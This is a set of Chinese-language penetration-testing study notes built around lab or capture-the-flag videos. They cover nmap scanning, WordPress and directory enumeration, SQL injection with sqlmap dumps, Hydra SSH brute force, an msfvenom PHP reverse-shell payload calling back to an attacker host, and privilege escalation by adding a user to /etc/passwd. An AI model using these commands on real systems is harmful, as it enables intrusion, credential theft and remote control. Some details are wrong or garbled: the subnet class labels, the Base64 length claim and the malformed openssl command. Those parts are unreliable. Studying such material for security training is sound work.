# 主機發現

## 實戰一:影片
- https://www.youtube.com/watch?v=yfAlZ-_G2LU&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=40

### C段掃描
- 舉例: 192.168.142.1/24:
    - 子網掩碼8位: 11111111.0000000.000000000.00000000代表:255.0.0.0 (A類IP地址)
    - 子網掩碼16位: 11111111.11111111.00000000.00000000代表: 255.255.0.0 (A類IP地址)
    - 子網掩碼24位: 11111111.11111111.11111111.00000000代表: 255.255.255.0 (C類IP地址)

#### 使用工具
1. nmap
```
nmap -sP IP/24
```
- -sP: Ping掃描
- 先扣除最小/最大的IP位置 (刪去法)

### 獲取該主機運行的服務
- 端口掃描: 端口與服務之間的關係，一個程序會占用一個端口號

#### 利用工具
1. nmap
```
nmap -p 1-65535 -A 主機IP
```
- -p: 指定端口區間，若不設定預設掃描常用端口

### 針對端口對應操作
- 80端口 http:
    - 右鍵查看源代碼(F12)
    - 目錄掃描: 查看是否存在敏感信息目錄
        - 工具:
            1. dirb (Kali自帶工具)
            ```
            dirb domain -X .php,.txt,.zip
            ```
            - -X: 針對指定擴展名搜索

### FUZZ
- 模糊掃描: 
    - 功能:
        1. 找到參數
        2. SQL注入
        3. 密碼暴力破解
        4. 過WAF

#### 使用工具
- wfuzz (Kali自帶)
- wpscan (Wordpress專門掃描器)
    ```
    wpscan --url link_url --enumerate u
    ```
    - --enumerate u: 枚舉所有用戶名

### WORDPRESS漏洞利用
#### 滲透思路
- 前提: 已滲透web (wordpress)，如何更近一步的滲透至主機端獲取更多有價值資料
    - 文件上傳漏洞:
        1. 一句話木馬: 反手上傳shell (找上傳點)
            - 缺點: 殺軟、無法持續連接目標(內網、動態IP)

        2. 反彈連接: 上傳php文件反彈連接
            - 讓目標主動連接到我的攻擊機

        3. MSF: 
            - 利用漏洞數據庫生成payload
                - Php反彈連接並利用漏洞達到提權目的
        ```
        msfvenom -p php/meterpreter/reverse_tcp lhost=local_ip lport=port -o file.php
        ```

#### 提權思路
- 已滲透反彈web shell要如何滲透至深層
    1. 敏感文件收集
        - ls -a
    2. 歷史命令
    3. sudo -l
    4. 操作系統內和漏洞提權
        - msf漏洞數據庫地址: /usr/share/exploitdb/exploits/linux/local

## 實戰二:影片
- https://www.youtube.com/watch?v=yxD7E8aCV18&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=48

### BASE64 MD5 解碼
#### 編碼特徵
1. MD5 - 32字符
2. SHA-1 - 40字符
3. Base64 - 64字符

### CMS識別思路
- 登入框:
    1. 爆破
    2. 注入
    3. 萬能密碼
    4. 弱密碼
    5. XSS

- 登入到CMS後台後:
    - 寫shell:
        1. 文件上傳
        2. 內容寫入
    - 敏感信息收集
    - 搜尋CMS漏洞

### 登入後台(tomcat)後提權思路
1. 內核漏洞搜尋
2. 查看敏感文件
    - /etc/passwd
    - cd ~
    - Apache
        - /var/www/html
3. sudo -l: 可以用root身分執行權限
4. 歷史命令分析
    - history

## 實戰三:影片
- https://www.youtube.com/watch?v=sF28D-iRx_0&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=56

### 透過SQL注入獲取管理員密碼
#### web滲透思路
1. 找上傳
2. 看源碼
3. 登入頁
    - 弱口令爆破
        - 缺點: 需要字典或獲取更多有用的資訊
4. 目錄掃描(找敏感文件)
    - 工具利用: nikto
    ```
    nikto -host ip
    ```
5. SQL注入
    - 常用寫法:
    ```
    ' or 1=1 --+
    ```
    - 工具利用: SQLMAP
    ```
    sqlmap -u "result route" --data="參數=1"
    ```
    1. 當確認可以利用SQL注入漏洞後開始找庫名/找表名/找列名/找數據
    ```
    sqlmap -u "result route" --data="參數=1" --current-db
    ```
        - --current-db: 當前數據庫
        - --dbs: 全部的數據庫
        - -D DBname --tables: 指定數據庫，顯示該數據庫的全部數據表
        - -D DBname -T TableName --dump: 匯出該數據表內容
    2. 獲取web管理員的帳號密碼並登入管理後台
    

6. XSS漏洞:
    - 主要攻擊訪問該網頁的客戶端

### 本地文件包含漏洞
- 利用文件包含漏洞，收集敏感信息文件
- Linux一定有甚麼文件存在
    - /etc/passwd
    - /var/www/html/index.php (aparch)

### FUZZ爆破web密碼

### knockd敲門服務
- 配置knockd服務，並配置端口列表，必須先敲門列表內端口後才能進入正確端口，讓SSH端口更加安全
- 文件配置路徑:
    - /etc/knockd.conf
    - 再利用找到配置文件敲門的端口，利用nmap發起連接端口，然後再連結SSH
### Hydra爆破SSH密碼
- 爆破後獲取SSH登入帳號密碼後，後續操作思路
    1. 查看敏感文件
        - ls -a 
        - find / -name
    2. sudo -l
    3. 操作系統漏洞
    4. history

- rockyou.txt: 超過 1400 萬個密碼可做為密碼爆破利用文件

### /ect/passwd 添加用戶提權
- 利用工具: openssl
```
openssl passwd -l -solt name psw
```
